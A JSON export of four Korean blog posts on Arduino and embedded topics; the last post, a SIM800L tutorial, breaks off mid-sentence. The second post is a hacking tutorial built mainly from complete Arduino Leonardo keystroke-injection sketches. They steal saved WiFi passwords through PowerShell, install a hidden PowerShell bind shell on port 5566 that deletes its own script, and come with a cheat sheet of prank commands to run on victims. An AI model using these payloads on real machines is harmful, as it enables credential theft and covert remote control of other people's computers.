{"pageProps":{"posts":[{"title":"리눅스에서 HackPack 연결하는 방법","description":"","date":"2024-06-22 18:54","slug":"2024-06-22-ConnectingtoHackPackviaLinux","content":"\n\n해프팩은 이번 주에 출시된 크런치랩스의 정말 멋진 엔지니어링 상자에요. 조금 놀다가 흥미로운 것을 발견하면 글을 올릴 거예요.\n\n지금까지의 여정을 공유하고 싶었어요. 저는 아직 조금만 놀아봤는데 IR 터렛을 예비 라즈베리 파이에 연결했어요. 아마존에서 USB-A to USB-C 케이블을 사용했지만 데이터를 전송하는 케이블이면 되요. 정말 쉬웠어요.\n\n- 장치를 연결하고 해제하여 상자가 어떤 tty****에 연결되어 있는지 알아보세요. 저는 /dev/ttyUSB0에 연결됐어요.\n- 다음 명령을 사용하여 터미널 라인 설정을 합니다 (필요하면 장치를 바꿔주세요): stty -F /dev/ttyUSB0 raw 9600\n- 명령을 실행하세요: cat /dev/ttyUSB0 (또는 다른 장치)\n\n저는 그 후에 버튼 누름에 대한 디버그 데이터를 출력하기 시작했어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-ConnectingtoHackPackviaLinux_0.png\" />\n\n어쨌든, 오늘 즐거웠어요!\n\n출처:\n\n- https://arduino.stackexchange.com/questions/79058/access-serial-monitor-on-linux-cli-using-arduino-cli","ogImage":{"url":"/assets/img/2024-06-22-ConnectingtoHackPackviaLinux_0.png"},"coverImage":"/assets/img/2024-06-22-ConnectingtoHackPackviaLinux_0.png","tag":["Tech"],"readingTime":1},{"title":"아두이노로 컴퓨터 해킹하는 방법","description":"","date":"2024-06-22 18:52","slug":"2024-06-22-HackingacomputerusingArduino","content":"\n\n상상해보세요...\n\n이미지를 보셨죠! 이 글에서 나는 어떤 사람이 화장실에 간 동안 무단 침입한 미해금 컴퓨터에 잠입하는 방법을 설명할 겁니다. [주의: 컴퓨터 해킹 전 해당 사람으로부터 허가를 받았으며, 해킹이 완료된 후 컴퓨터를 원래 상태로 복원했습니다] 다만, 그 정도 시간 안에 할 수 있는 일에는 한계가 있었죠. 해킹 과정을 가속화하기 위해 나는 아두이노를 사용해 나만의 Rubber Ducky USB를 만들었습니다.\n\n# 아두이노 소개\n\n아두이노는 C 프로그래밍 언어를 사용하여 하드웨어 장치를 제어할 수 있게 해주는 마이크로 컨트롤러 및 마이크로 컨트롤러 키트입니다. 아두이노에는 각각 고유한 특성을 가진 여러 종류가 있습니다. 예를 들어, 아두이노 우노는 가격이 저렵하고 기본 기능 세트를 갖춰 가장 인기 있는 아두이노 보드로 간주됩니다.\n\n<div class=\"content-ad\"></div>\n\n이 글은 ATmega32u4를 기반으로 한 마이크로 컨트롤러 보드인 Arduino Leonardo에 초점을 맞추고 있습니다. 내장 USB 통신을 갖추고 있어 컴퓨터에 연결된 키보드 또는 마우스처럼 위장할 수 있습니다. 다른 Arduino 제품인 Nano와 Uno도 사용해 봤지만, 컴퓨터를 속일 수 없었어요.\n\n![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_0.png)\n\n이 데모에서는 특정 기능을 수행하는 두 개의 버튼을 설정했습니다. 왼쪽 버튼은 \"위장\" 기능을 트리거하고 동시에 놀라울 정도로 빠른 속도로 키를 입력하고 데이터를 캡처합니다. 오른쪽 버튼은 공격에 사용하는 컴퓨터로 캡처한 데이터를 내보내는 역할을 합니다.\n\n먼저, Arduino Leonardo의 하드웨어 구성 요소를 소개하고 마이크로 컨트롤러 및 마이크로 컨트롤러 키트에서 기본 Arduino 제어기능을 시연해 보겠습니다.\n\n<div class=\"content-ad\"></div>\n\n아두이노 보드는 모두 setup 함수와 loop 함수로 구성되어 있어요.\n\n## Setup 함수\n\n이 함수는 아두이노가 전원이 켜질 때 한 번만 실행돼요.\n\n## Loop 함수\n\n<div class=\"content-ad\"></div>\n\n이 기능은 설정 함수를 실행하면 계속 실행됩니다.\n\n![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_1.png)\n\n회로 기판(왼쪽) 다이어그램에서 버튼이 각각 핀 2와 핀 3에 연결되어 있음을 알았습니다. 따라서 스케치(오른쪽)에서 pinMode(2, INPUT); 및 pinMode(3, INPUT);를 각각 입력 구성 요소로 정의했습니다. loop 함수는 우리 함수의 실행을 정의한 곳입니다.\n\n# 공격 1: WiFi 비밀번호 도용\n\n<div class=\"content-ad\"></div>\n\n컴퓨터가 WiFi에 연결될 때마다 WiFi 비밀번호가 시스템에 저장됩니다. 이 좋은 소식은 PowerShell 명령을 활용하여 WiFi 서비스 세트 식별자(SSID)와 비밀번호 목록을 얻을 수 있다는 것입니다.\n\n```js\n#include <Keyboard.h>\n#include <EEPROM.h>\nchar stringArray[500] = {\"\"};\nboolean extracted = false, dispatched = false;\nint extractButton = 2, dispatchButton = 3;\n\nvoid setup() {    \n    Serial.begin(9600);\n    pinMode(extractButton, INPUT);\n    pinMode(dispatchButton, INPUT);\n    Keyboard.begin();\n}\nvoid loop() {\n    if(digitalRead(extractButton) == HIGH && !extracted) {\n        extractingData();\n        extracted = true;\n    }\n    if(digitalRead(dispatchButton) == HIGH && !dispatched) {\n        dispatchingData();\n        dispatched = true;\n    }    \n    if(digitalRead(extractButton) == LOW)\n        extracted = false;\n    if(digitalRead(dispatchButton) == LOW)\n        dispatched = false;\n}\n\nvoid extractingData() {\n    delay(1000);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.print(\"Powershell\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.println(\"(netsh wlan show profiles) | Select-String \\\"\\\\:(.+)$\\\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)}  | Select-String \\\"Key Content\\\\W+\\\\:(.+)$\\\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } | Format-Table -AutoSize | Out-String -OutVariable dataCaptured\");\n    delay(500);\n\n    Keyboard.println(\"$comPort = ((Get-WmiObject -query \\\"SELECT * FROM Win32_PnPEntity\\\" | Where {$_.Name -Match \\\"COM\\\\d+\\\"}).name).Split(\\\"COM\\\")\");\n    delay(200);\n    Keyboard.println(\"$comPort = [int]$comPort[$comPort.length - 1].replace(\\\")\\\", \\\"\\\")\");\n    delay(200);\n    Keyboard.print(\"$serialObject = new-Object System.IO.Ports.SerialPort COM\");\n    Keyboard.print(\"$comPort\");\n    Keyboard.println(\", 9600, None, 8, one\");\n    delay(200);\n    Keyboard.println(\"$serialObject.Open()\");\n    delay(200);\n    Keyboard.println(\"$serialObject.Write(\\\"$dataCaptured\\\")\");\n    delay(200);\n    Keyboard.println(\"$serialObject.close()\");\n    delay(200);\n    Keyboard.println(\"exit\");\n    delay(200);\n    for(int i=0; i<sizeof(stringArray)-1; i++)\n        stringArray[i] = Serial.read();\n    EEPROM.put(1, stringArray);\n}\n\nvoid dispatchingData() {\n    delay(500);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.println(\"notepad\");\n    delay(700);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.print(EEPROM.get(1, stringArray));\n}\n```\n\n# 공격 요약\n\n- 먼저 Arduino Leonardo를 트롤하는 컴퓨터에 USB 포트를 통해 연결합니다. 앞서 언급한 두 개의 버튼을 기억하시나요? 왼쪽 버튼을 누르면 프로그램이 PowerShell 터미널을 시작하고 명령을 입력하기 시작합니다.\n- 프로그램은 WiFi의 SSID와 비밀번호를 추출하여 Arduino의 전기적으로 지워지지 않는 프로그램 가능 읽기 전용 메모리(EEPROM)에 저장합니다. 비휘발성 플래시 메모리 장치이므로 저장된 정보는 더 이상 전원이 공급되지 않아도 유지됩니다.\n- Arduino가 기능을 실행한 후에는 피해자 컴퓨터에서 이를 분리하고 제 컴퓨터에 연결합니다. 이번에는 EEPROM에 저장된 데이터를 Arduino가 내 컴퓨터로 덤프하는 오른쪽 버튼을 누릅니다.\n\n<div class=\"content-ad\"></div>\n\n# WiFi SSID 표시 명령어\n\n```js\n(netsh wlan show profiles) |\nSelect-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |\n%{(netsh wlan show profile name=\"$name\" key=clear)} |\nSelect-String \"Key Content\\W+\\:(.+)$\" |\n%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |\n%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } |\nFormat-Table –AutoSize |\nOut-String -OutVariable dataCaptured\n```\n\n<img src=\"/assets/img/2024-06-22-HackingacomputerusingArduino_2.png\" />\n\nWiFi SSID 표시 명령어가 길고 이해하기 어렵습니다. 이 글의 다음 부분에서는 명령어를 몇 가지 소화 가능한 섹션으로 나눠 코드의 기능을 이해하기 쉽게 설명하겠습니다.\n\n<div class=\"content-ad\"></div>\n\n# 명령어 이해하기\n\n## 섹션 A\n\n이 명령어 섹션은 캐시된 SSID를 표시하고 \":(.+$\" 문자열을 정규 표현식으로 필터링합니다.\n\n```js\n(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim();\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-HackingacomputerusingArduino_3.png\" />\n\n## 섹션 B\n\n```js\n%{(netsh wlan show profile name=\"$name\" key=clear)}\n```\n\n이전 파이프에서 검색한 $name 변수를 사용했음을 주의하세요. netsh wlan 함수를 다시 호출하여 SSID에 대한 추가 정보를 얻습니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-HackingacomputerusingArduino_4.png\" />\n\n## 섹션 C\n\n여기서 Key Content(비밀번호)를 추출하여 $pass 변수에 할당합니다.\n\n```js\nSelect-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}\n```\n\n<div class=\"content-ad\"></div>\n\n## 섹션 D\n\n마지막으로, 프로필 이름과 비밀번호 속성을 포함한 PS 객체를 생성하고 테이블 형식으로 표시하여 $dataCaptured에 작성합니다.\n\n```js\n%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } | Format-Table –AutoSize | Out-String -OutVariable dataCaptured\n```\n\n# EEPROM에 데이터 저장하는 명령\n\n<div class=\"content-ad\"></div>\n\n아두이노에 데이터를 기록하려면 컴퓨터와 아두이노는 직렬 통신을 사용하여 상호 작용해야 합니다. 직렬 통신은 통신 채널 또는 USB를 통해 한 번에 한 비트씩 데이터를 전송하는 프로세스입니다. 각 포트는 COM1, COM2, COM3, COM4 등으로 식별됩니다. 각 COM은 입출력(I/O) 및 인터럽트 요청(IRQ) 주소를 나타냅니다. I/O 주소는 마우스나 키보드와 같은 주변 장치와 데이터를 전송하고 수신합니다. 직렬 통신의 속도 또는 '보드 속도'는 초당 비트로 측정됩니다. 이 데모에서는 9600비트 초당을 사용했습니다.\n\n```bash\n# 사용 가능한 COM 포트 검색\n$comPort = ((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\" | Where {$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\");\n$comPort = [int]$comPort[$comPort.length - 1].replace(\")\", \"\");\n\n# COM 포트에 연결하여 데이터 기록 시작\n$serialObject = new-Object System.IO.Ports.SerialPort COM$comPort , 9600, None, 8, one;\n$serialObject.Open();\n$serialObject.Write(\"$dataCaptured\");\n```\n\n데이터를 전송한 후, 아두이노를 피해자의 컴퓨터에서 분리하여 내 컴퓨터에 연결합니다. 그런 다음, 캡처된 데이터를 제 노트패드로 전송하는 배송 프로세스를 시작하려면 오른쪽 버튼을 트리거합니다.\n\n![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_5.png)\n\n<div class=\"content-ad\"></div>\n\n# 공격 2: 쉘 열기\n\n여기서 여러분은 아마 생각하고 있을거에요: 우리 피해자의 WiFi SSID와 비밀번호를 훔치는 것에 그치지 말고 더 많은 정보를 얻을 수는 없을까요? 이 섹션에서는 쉘을 열어보는 방법을 보여드릴게요.\n\n```js\n#include <Keyboard.h>\n#include <EEPROM.h>\n\nchar stringArray[50] = {\"\"};\nboolean extracted = false, dispatched = false;\nint extractButton = 2, dispatchButton = 3;\nvoid setup() {\n    Serial.begin(9600);\n    pinMode(extractButton, INPUT);\n    pinMode(dispatchButton, INPUT);\n    Keyboard.begin();\n}\nvoid loop() {\n    if(digitalRead(extractButton) == HIGH && !extracted) {\n        shell();\n        extracted = true;\n    }\n    if(digitalRead(dispatchButton) == HIGH && !dispatched) {\n        ipaddr();\n        dispatched = true;\n    }\n    if(digitalRead(extractButton) == LOW)\n        extracted = false;\n    if(digitalRead(dispatchButton) == LOW)\n        dispatched = false;\n}\n\nvoid shell() {\n    delay(1000);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.print(\"cmd\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.println(\"set updateSource=\\\"function windowsUpdate{$stream=$client.GetStream();[byte[]]$bytes=0..65535^|^%{0};$sendbytes=([text.encoding]::ASCII).GetBytes('Running as user '+$env:username+' on '+$env:computername+'.');$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'^>');$stream.Write($sendbytes,0,$sendbytes.Length);while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$EncodedText=New-Object -TypeName System.Text.ASCIIEncoding;$data=$EncodedText.GetString($bytes,0,$i);try{$sendback=(IEX -Command $data 2^>^&1 ^| Out-String );}catch{}$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '^> ';$x = ($error[0] ^|Out^-String);$error.clear();$sendback2 = $sendback2 + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();if($listener){$listener.Stop();}$listener=[System.Net.Sockets.TcpListener]5566;$listener.start();rm update.ps1;$client=$listener.AcceptTcpClient();windowsUpdate\\\"\");\n    delay(500);\n\n    Keyboard.println(\"echo %updateSource:~1,1014%>update.ps1\");\n    delay(200);\n    Keyboard.println(\"powershell -ep bypass -windowstyle hidden -file update.ps1\");\n    delay(500);\n\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.print(\"Powershell\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.println(\"Get-NetIPAddress -AddressFamily IPv4 -suffixorigin dhcp|select ipaddress|Out-String -OutVariable d\");\n    delay(200);\n    Keyboard.println(\"$c=((Get-WmiObject -query \\\"SELECT * FROM Win32_PnPEntity\\\"|Where{$_.Name -Match \\\"COM\\\\d+\\\"}).name).Split(\\\"COM\\\")\");\n    delay(200);\n    Keyboard.println(\"$c=[int]$c[$c.length-1].replace(\\\")\\\",\\\"\\\")\");\n    delay(200);\n    Keyboard.print(\"$s=new-Object System.IO.Ports.SerialPort COM\");\n    Keyboard.print(\"$c\");\n    Keyboard.println(\",9600,None,8,one\");\n    delay(200);\n    Keyboard.println(\"$s.Open()\");\n    delay(200);\n    Keyboard.println(\"$s.Write(\\\"$d\\\")\");\n    delay(200);\n    Keyboard.println(\"$s.close()\");\n    delay(200);\n    Keyboard.println(\"exit\");\n    delay(200);\n\n    for(int i=0; i<sizeof(stringArray)-1; i++)\n        stringArray[i] = Serial.read();\n\n    EEPROM.put(1, stringArray);\n}\nvoid ipaddr() {\n    delay(500);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.println(\"notepad\");\n    delay(700);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.print(EEPROM.get(1, stringArray));\n}\n```\n\n위의 코드는 복잡해 보일 수 있으니, 단계별로 살펴보도록 하죠:\n\n<div class=\"content-ad\"></div>\n\n- 아두이노를 피해자 컴퓨터에 연결한 후 왼쪽 버튼을 누르면, 프로그램이 명령 프롬프트를 실행하고, 거기에 PowerShell 쉘 코드를 저장하는 updateSource라는 명령 프롬프트 변수를 생성합니다.\n- 그 후에 프로그램은 updateSource의 값이 기록된 PowerShell 스크립트 update.ps1을 생성합니다.\n- 마지막으로 프로그램은 명령 프롬프트 코드 powershell -ep bypass -windowstyle hidden -file update.ps1을 실행합니다. 이로써 update.ps1 프로그램이 백그라운드에서 실행됨을 보장합니다.\n- Exploit을 마치기 전에, 프로그램은 다시 PowerShell을 실행하고 피해자의 IP 주소를 EEPROM에 기록합니다. 이것은 이전에 설명한 WiFi 암호를 전송하는 것과 유사합니다.\n- 아두이노를 피해자 컴퓨터에서 분리한 후 내 컴퓨터에 연결합니다. 이번에는 오른쪽 버튼을 눌러 피해자의 IP 주소를 언로드합니다.\n- bind shell을 설정하기 위해 netcat 연결을 수립하여 공격을 완료합니다.\n\n아래는 정리된 셸 코드 버전입니다:\n\n```js\n# 쉘 기능 정의\nfunction windowsUpdate {\n  $stream = $client.GetStream();\n  [byte[]]$bytes = 0..65535 | %{0};\n  $sendbytes = ([text.encoding]::ASCII).GetBytes('Running as user '+$env:username+' on '+$env:computername+'.');\n  $stream.Write($sendbytes, 0, $sendbytes.Length);\n  $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>');\n  $stream.Write($sendbytes, 0, $sendbytes.Length);\n  while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {\n    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding;\n    $data = $EncodedText.GetString($bytes,0,$i);\n    \n    try {\n      # 공격자로부터 명령 수신\n      $sendback=(IEX -Command $data 2 >&1 | Out-String );\n    }\n    catch {}\n    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> ';\n    $x = ($error[0] | Out-String);\n    $error.clear();\n    $sendback2 = $sendback2 + $x;\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte, 0, $sendbyte.Length);\n    $stream.Flush();\n  }\n  $client.Close();\n  if ($listener) {\n    $listener.Stop();\n  }\n}\n\n# 연결 대기\n$listener = [System.Net.Sockets.TcpListener] 5566;\n$listener.start();\n\n# 여기서 update.ps1 제거!\nrm update.ps1;\n\n$client = $listener.AcceptTcpClient();\n\n# 함수 호출\nwindowsUpdate;\r\n```\n\n요약하면, 이 프로그램은 접속한 사람이 사용할 수 있는 포트 5566에서 bind shell을 구축하는 기능을 만들었습니다. 프로그램은 들어오는 연결을 기다리면서 update.ps1 파일을 삭제합니다. 이 시점에서 저는 bind shell 함수에 연결하여 피해자의 컴퓨터를 제어하기 시작합니다. PowerShell 스크립팅이 이렇게 간단한 것이죠?\n\n<div class=\"content-ad\"></div>\n\n# 데모 타임\n\n여기 데모에 대한 몇 가지 흥미로운 비디오가 있어요:\n\n- 피해자에게 셸 코드 삽입하고 IP 주소 추출하기\n- IP 주소 송부 및 피해자 컴퓨터 제어하기\n\n<div class=\"content-ad\"></div>\n\n우리의 알지 못하는 희생자들에게 소식을 전하는 여러 가지 방법이 있습니다. 여러분이 할 수 있는 일들에 대한 치트 시트입니다:\n\n```js\n// 피해자의 컴퓨터로 키 입력 보내기\n$wshell = New-Object -ComObject wscript.shell;\n$wshell.sendKeys(\" \");\n$wshell.sendKeys(\"Hahaha\");\n\n// 파일에 쓰기\necho You have been hacked! > hacked.txt\n\n// 메모장으로 파일 열기\nnotepad hacked.txt\n\n\n// 브라우저 닫기\ntaskkill /IM firefox.exe /F\ntaskkill /IM chrome.exe /F\n\n// Firefox를 위한 URL을 열기\ncd \"C:\\Program Files\\Mozilla Firefox\"\nfirefox.exe https://www.google.com/\n\n// Chrome을 위한 URL을 열기\ncd \"경로\\Chrome\"\nchrome.exe https://www.google.com/\r\n```\n\n# 요약\n\n이 글에서는 아두이노의 기본 기능과 EEPROM, 시리얼 통신, USB Rubber Ducky, 그리고 PowerShell 스크립팅을 소개했습니다.\n\n해킹 프로세스가 백그라운드에서 실행되기 때문에 희생자들은 자신의 컴퓨터가 해킹당했는지 감지할 수 없을 것입니다. 컴퓨터가 해킹당하는 잠재적 위험을 줄이기 위해 — 내 친애하는 동료들도 포함하여 — 책상을 비울 때 컴퓨터를 잠그는 것을 항상 기억해 주세요.\n\n<div class=\"content-ad\"></div>\n\n안녕하세요! 사이버 보안은 여러분부터 시작됩니다!\n\n참고 자료:","ogImage":{"url":"/assets/img/2024-06-22-HackingacomputerusingArduino_0.png"},"coverImage":"/assets/img/2024-06-22-HackingacomputerusingArduino_0.png","tag":["Tech"],"readingTime":14},{"title":"임베디드 소프트웨어 엔지니어가 피해야 할 실수 7가지","description":"","date":"2024-06-22 18:51","slug":"2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer","content":"\n\n내가 임베디드 소프트웨어 엔지니어로 일하면서 첫걸음에 몇 가지 실수를 했는데, 그것들이 나를 속박했었어요. 나는 이 실수들을 공유하여 엔지니어링 학생들이 같은 함정을 피할 수 있도록 도와주고 싶어요. 🚫⚠️\n\n실수 #1: 개발에 IDE에 의존하기 🖥️\n나는 처음에 Arduino와 같은 IDE에 완전히 의존해서 내 임베디드 코드를 작성하고 컴파일했어요. IDE는 빠른 프로토타이핑에 도움이 될 수 있지만, 결국은 전체 툴체인과 개발 프로세스를 정말로 이해하는 것을 방해한다는 점을 깨달았어요.\n\n<div class=\"content-ad\"></div>\n\n![IDEs take away important details like the compiler, linker, debugger, and build system. This might seem convenient at first, but it means you don’t develop a deep understanding of how your code is getting from source to binary. Companies want engineers who understand the nuts and bolts of the entire development workflow, not just what an IDE’s GUI presents.\n\nThe solution? Learn to use a proper toolchain with a command-line build system, standalone compiler, debugger, etc. It’s more work upfront, but you’ll become a far more versatile and valuable embedded engineer.\n\nMistake #2: Not Using Git Effectively\nAnother big mistake I made was not leveraging Git and GitHub properly in my projects. I would typically just upload the final project code to GitHub when I was done, without any of the version history, commit messages, or evidence of my development process.\n\n<div class=\"content-ad\"></div>\n\n![AvoidTheseMistakesasEmbeddedSoftwareEngineer](/assets/img/2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer_2.png)\n  \n회사들은 코드를 작성하는 것뿐만 아니라, 생각을 많이 하고 반복적으로 개발하는 개발자로 보여줄 필요가 있습니다. 버전 컨트롤을 사용하여 진행 상황을 추적하고 아이디어를 실험하며 도전을 극복하는 개발자가 되어야 합니다. 잘 문서화되고 자주 업데이트되는 프로젝트로 가득 찬 GitHub 프로필은 여러분의 기술에 대해 말해줍니다. 📈👨‍💻\n\n처음부터 Git을 업무 흐름의 핵심 부분으로 만드세요. 조기에 자주 커밋하고 의미 있는 커밋 메시지를 사용하고 프로젝트 전반에 걸쳐 다양한 문제에 대해 어떻게 대처했는지 보여주세요. 이렇게 하면 여러분의 GitHub 프로필이 여러분의 능력을 진정으로 보여주는 포트폴리오가 될 것입니다. 🔄📝\n\n이러한 실수를 초기에 피하는 것은 여러분이 숙련된, 시장에서 인정받을 수 있는 임베디드 소프트웨어 엔지니어로 거듭날 수 있는 강력한 길을 제시합니다. 전체 도구 체인을 이해하고 개발 여정을 문서로 기록하려면 버전 컨트롤에 집중하세요. 이렇게 하면 여러분이 꿈꿔온 임베디드 역할을 얻는 길에 큰 도움이 될 것입니다. 🚀🌟","ogImage":{"url":"/assets/img/2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer_0.png"},"coverImage":"/assets/img/2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer_0.png","tag":["Tech"],"readingTime":2},{"title":"SIM800L로 Arduino에서 메시지를 보내고 전화 거는 방법","description":"","date":"2024-06-22 18:49","slug":"2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L","content":"\n\n이 기사에서는 아두이노로 문자 메시지를 보내고 전화를 거는 방법을 공유하고 싶습니다. 그 방법으로 \"SIM800L\"을 사용할 겁니다.\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_0.png)\n\nSIM800L은 세계에서 가장 작은 GSM(Global System for Mobile communication) 모듈입니다. 이 모듈은 UART(Universal Asynchronous Receiver / Transmitter)를 통해 아두이노와 데이터를 교환하는 통신 프로토콜을 사용합니다.\n\n이것은 취미 프로젝트에 아주 좋은 저렴한 가격의 솔루션이에요! 아래 링크를 통해 구입할 수 있습니다 (스폰서가 아니에요, 제가 Aliexpress에서 구입했는데 아주 잘 작동합니다!):\n\n<div class=\"content-ad\"></div>\n\n## 하드웨어 구매 링크:\n\n- SIM800L: AliExpress (4$27)\n- 아두이노 메가: AliExpress (11$31)\n- 저항 및 LED 키트: AliExpress (2$74)\n- 점퍼 케이블: AliExpress (1$07)\n- 최소 3.4V-4.4V 및 최소 2A를 제공할 수 있는 파워 뱅크.\n\n# YouTube 비디오\n\n만약 이 튜토리얼의 비디오 버전을 선호한다면, 제 YouTube 채널을 방문해 주세요:\n\n<div class=\"content-ad\"></div>\n\n# 단계 1: 보드에 솔더링하기!\n\n보드를 받았을 때 핀들이 아직 솔더링되지 않았습니다. 따라서 먼저 SIM800L 보드의 핀들을 솔더링해야 합니다. 그리고 이 모듈에는 2개의 안테나가 함께 제공됩니다: 하나는 금속 나선 모양의 안테나이고, 다른 하나는 전선이 달린 녹색 보드입니다.\n\n![이미지1](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_1.png)\n\n![이미지2](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_2.png)\n\n<div class=\"content-ad\"></div>\n\nSIM800L를 외부에서 사용할 계획이라면 나선형 안테나를 사용할 수 있어요. 나선형 안테나를 사용하기 위해서는 전자 기판에 납땜을 해야 해요.\n\n만약 SIM800L를 집 내부 또는 케이스 내부에서 사용할 계획이라면, 보드 버전 안테나를 선택하는 것이 더 나아요. 이 안테나를 사용하면 나선형 안테나에 비해 더 좋은 연결을 얻을 수 있어요. 안테나를 사용하려면 전자 기판에 끼워 넣기만 하면 돼요.\n\n핀들이 기판에 납땜되면 다음과 같이 보일 거예요:\n\n![image](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_3.png)\n\n<div class=\"content-ad\"></div>\n\n\n![SIM800L](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_4.png)\n\n# About SIM800L\n\nThe pins of SIM800L that we are going to use are:\n\n![SIM800L Pins](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_5.png)\n\n\n<div class=\"content-ad\"></div>\n\nSIM800L을 사용하여 문자 메시지를 보내려면 아래와 같이 아두이노 메가에 연결해야 합니다:\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_6.png)\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_7.png)\n\n여기서는 10 kOhm의 3개의 저항을 배선도에 사용하여 전압을 5V에서 3.3V로 나눕니다. SIM800L 모듈은 3.3V 논리 수준을 갖고 있지만 아두이노는 5V 논리 수준을 갖고 있기 때문에 모듈의 Rx 핀을 아두이노의 디지턈 핀에 직접 연결할 수 없습니다.\n\n<div class=\"content-ad\"></div>\n\n저희 프로젝트에서는 SoftwareSerial 라이브러리를 사용할 예정입니다. 이 라이브러리를 이용하면 아두이노 보드의 다른 디지털 핀을 사용하여 시리얼 통신이 가능하며, 이 기능을 소프트웨어로 구현하여 이름이 \"SoftwareSerial\"인 것입니다. 다만, 이 라이브러리에는 제약 사항이 있습니다. 메가 및 메가 2560 보드의 모든 핀이 변경 인터럽트를 지원하지 않기 때문에 RX로 사용할 수 있는 핀은 다음과 같습니다: 10, 11, 12, 13, 14, 15, 50, 51, 52, 53, A8 (62), A9 (63), A10 (64), A11 (65), A12 (66), A13 (67), A14 (68), A15 (69). 이에 따라 저희의 배선도에서 핀 10과 핀 11을 사용하고 있습니다.\n\n## LED 상태 표시등\n\n<img src=\"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_8.png\" />\n\n코드를 테스트하기 전에 SIM800L의 LED 표시등을 확인해 보겠습니다. 이 LED는 셀룰러 네트워크의 상태를 나타내기 위해 다른 속도로 깜박입니다.\n\n<div class=\"content-ad\"></div>\n\n- 1초마다 깜빡입니다: 칩은 실행 중이지만 아직 셀룰러 네트워크에 연결되지 않았습니다.\n- 2초마다 깜빡입니다: 요청된 GPRS 데이터 연결이 활성화되었습니다.\n- 3초마다 깜빡입니다: 모듈이 셀룰러 네트워크에 연결되어 음성과 텍스트 메시지를 주고받을 수 있습니다.\n\n## 작동 전압\n\nSIM800L의 작동 전압은 3.4V - 4.4V입니다. 하지만, SMS를 보내거나 전화를 걸 때 전류가 최대 2A까지 증가할 수 있습니다. 이는 매우 중요한 기준입니다. 공급 전력이 적어도 2A와 3.4V를 제공할 수 없다면 SMS를 보내거나 전화를 걸지 못할 수 있습니다.\n\n이 프로젝트에서는 최대 5V와 3A를 제공하는 충전 보조 배터리를 사용했습니다. 보드는 잘 작동하지만, 이상적으로는 동작 전압 범위(3.4V - 4.4V) 내에 공급 전압이 들어오도록 DC-DC 컨버터를 